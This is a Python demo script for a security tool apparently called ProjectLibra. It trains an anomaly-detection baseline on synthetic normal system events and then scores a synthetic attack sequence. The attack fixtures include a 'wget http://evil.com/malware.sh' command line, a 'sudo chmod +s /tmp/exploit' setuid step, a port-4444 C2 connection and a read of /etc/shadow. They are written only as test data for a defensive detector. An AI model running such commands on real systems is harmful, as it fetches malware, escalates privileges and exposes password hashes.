#!/usr/bin/env python3
"""
ProjectLibra - ML Anomaly Detection Example

This script demonstrates the machine learning components
for behavioral baseline learning and anomaly detection.
"""

import asyncio
import sys
import random
from pathlib import Path
from datetime import datetime, timedelta

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.ml.feature_extractor import SecurityFeatureExtractor
from src.ml.baseline_learner import BaselineLearner
from src.ml.anomaly_detector import AnomalyDetector
from src.ml.pattern_detector import PatternDetector


def generate_normal_events(count: int) -> list:
    """Generate normal system events for baseline learning."""
    events = []
    normal_users = ["admin", "service", "app_user", "backup"]
    normal_processes = ["sshd", "nginx", "postgres", "systemd"]
    normal_ips = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]
    
    for i in range(count):
        event_type = random.choice(["login", "process", "network", "file"])
        
        if event_type == "login":
            events.append({
                "timestamp": datetime.now() - timedelta(hours=random.randint(0, 24)),
                "event_type": "authentication",
                "source": "auth_log",
                "severity": "info",
                "details": {
                    "user": random.choice(normal_users),
                    "ip": random.choice(normal_ips),
                    "success": True,
                    "method": "ssh"
                }
            })
        elif event_type == "process":
            events.append({
                "timestamp": datetime.now() - timedelta(hours=random.randint(0, 24)),
                "event_type": "process_start",
                "source": "process_monitor",
                "severity": "info",
                "details": {
                    "process": random.choice(normal_processes),
                    "pid": random.randint(1000, 5000),
                    "user": random.choice(normal_users),
                    "cpu_percent": random.uniform(0, 30),
                    "memory_percent": random.uniform(0, 20)
                }
            })
        elif event_type == "network":
            events.append({
                "timestamp": datetime.now() - timedelta(hours=random.randint(0, 24)),
                "event_type": "network_connection",
                "source": "network_monitor",
                "severity": "info",
                "details": {
                    "local_port": random.choice([22, 80, 443, 5432]),
                    "remote_ip": random.choice(normal_ips),
                    "remote_port": random.randint(40000, 60000),
                    "protocol": "tcp",
                    "bytes_sent": random.randint(100, 10000),
                    "bytes_recv": random.randint(100, 10000)
                }
            })
        else:
            events.append({
                "timestamp": datetime.now() - timedelta(hours=random.randint(0, 24)),
                "event_type": "file_access",
                "source": "file_monitor",
                "severity": "info",
                "details": {
                    "path": f"/var/log/{random.choice(['syslog', 'auth.log', 'nginx/access.log'])}",
                    "action": random.choice(["read", "write"]),
                    "user": random.choice(normal_users)
                }
            })
    
    return events


def generate_attack_events() -> list:
    """Generate suspicious events representing an attack."""
    return [
        # Phase 1: Reconnaissance
        {
            "timestamp": datetime.now() - timedelta(minutes=30),
            "event_type": "authentication",
            "source": "auth_log",
            "severity": "warning",
            "details": {
                "user": "root",
                "ip": "203.0.113.100",
                "success": False,
                "method": "ssh",
                "attempts": 50
            }
        },
        # Phase 2: Initial Access
        {
            "timestamp": datetime.now() - timedelta(minutes=25),
            "event_type": "authentication",
            "source": "auth_log",
            "severity": "info",
            "details": {
                "user": "admin",
                "ip": "203.0.113.100",
                "success": True,
                "method": "ssh"
            }
        },
        # Phase 3: Execution
        {
            "timestamp": datetime.now() - timedelta(minutes=20),
            "event_type": "process_start",
            "source": "process_monitor",
            "severity": "warning",
            "details": {
                "process": "wget",
                "pid": 9999,
                "user": "admin",
                "cmdline": "wget http://evil.com/malware.sh",
                "cpu_percent": 5,
                "memory_percent": 2
            }
        },
        # Phase 4: Privilege Escalation
        {
            "timestamp": datetime.now() - timedelta(minutes=15),
            "event_type": "process_start",
            "source": "process_monitor",
            "severity": "critical",
            "details": {
                "process": "sudo",
                "pid": 10000,
                "user": "admin",
                "cmdline": "sudo chmod +s /tmp/exploit",
                "cpu_percent": 2,
                "memory_percent": 1
            }
        },
        # Phase 5: Command and Control
        {
            "timestamp": datetime.now() - timedelta(minutes=10),
            "event_type": "network_connection",
            "source": "network_monitor",
            "severity": "critical",
            "details": {
                "local_port": 55555,
                "remote_ip": "198.51.100.50",
                "remote_port": 4444,
                "protocol": "tcp",
                "bytes_sent": 50000,
                "bytes_recv": 500000
            }
        },
        # Phase 6: Data Exfiltration
        {
            "timestamp": datetime.now() - timedelta(minutes=5),
            "event_type": "file_access",
            "source": "file_monitor",
            "severity": "critical",
            "details": {
                "path": "/etc/shadow",
                "action": "read",
                "user": "root"
            }
        }
    ]


async def main():
    """Demonstrate ML-based anomaly detection."""
    print("=" * 60)
    print("ProjectLibra - ML Anomaly Detection Demo")
    print("=" * 60)
    
    # Initialize components
    feature_extractor = SecurityFeatureExtractor()
    baseline_learner = BaselineLearner()
    anomaly_detector = AnomalyDetector(sensitivity=0.7)
    pattern_detector = PatternDetector()
    
    # Phase 1: Generate and learn from normal behavior
    print("\n[Phase 1] Learning Normal Behavior")
    print("-" * 40)
    
    normal_events = generate_normal_events(200)
    print(f"Generated {len(normal_events)} normal events for baseline")
    
    # Extract features from normal events
    for event in normal_events:
        features = feature_extractor.extract(event)
        baseline_learner.add_sample(features)
    
    # Train baseline model
    print("Training baseline model...")
    baseline_learner.train()
    print("✓ Baseline learned from normal behavior")
    
    # Phase 2: Detect anomalies in attack events
    print("\n[Phase 2] Analyzing Attack Events")
    print("-" * 40)
    
    attack_events = generate_attack_events()
    print(f"Analyzing {len(attack_events)} suspicious events...\n")
    
    for i, event in enumerate(attack_events, 1):
        # Extract features
        features = feature_extractor.extract(event)
        
        # Check against baseline
        is_anomaly, score = baseline_learner.is_anomaly(features)
        
        # Detect attack patterns
        patterns = pattern_detector.detect(event)
        
        print(f"Event {i}: {event['event_type']}")
        print(f"  Severity: {event['severity']}")
        print(f"  Anomaly Score: {score:.2f}")
        print(f"  Is Anomaly: {'🚨 YES' if is_anomaly else '✓ No'}")
        
        if patterns:
            print(f"  Detected Patterns:")
            for pattern in patterns:
                print(f"    - {pattern['name']} (MITRE: {pattern.get('mitre_id', 'N/A')})")
        print()
    
    # Phase 3: Full attack sequence analysis
    print("\n[Phase 3] Attack Chain Analysis")
    print("-" * 40)
    
    # Use pattern detector for attack chain analysis
    chain_analysis = pattern_detector.analyze_attack_chain(attack_events)
    
    print(f"Attack Chain Detected: {chain_analysis.get('chain_type', 'Unknown')}")
    print(f"Confidence: {chain_analysis.get('confidence', 0) * 100:.1f}%")
    print(f"Kill Chain Phases: {', '.join(chain_analysis.get('phases', []))}")
    
    print("\n" + "=" * 60)
    print("ML Demo Complete!")
    print("=" * 60)
    print("\nThe ML system successfully:")
    print("  • Learned normal system behavior from historical data")
    print("  • Detected anomalous events that deviate from baseline")
    print("  • Identified attack patterns mapped to MITRE ATT&CK")
    print("  • Correlated events into attack chain analysis")


if __name__ == "__main__":
    asyncio.run(main())
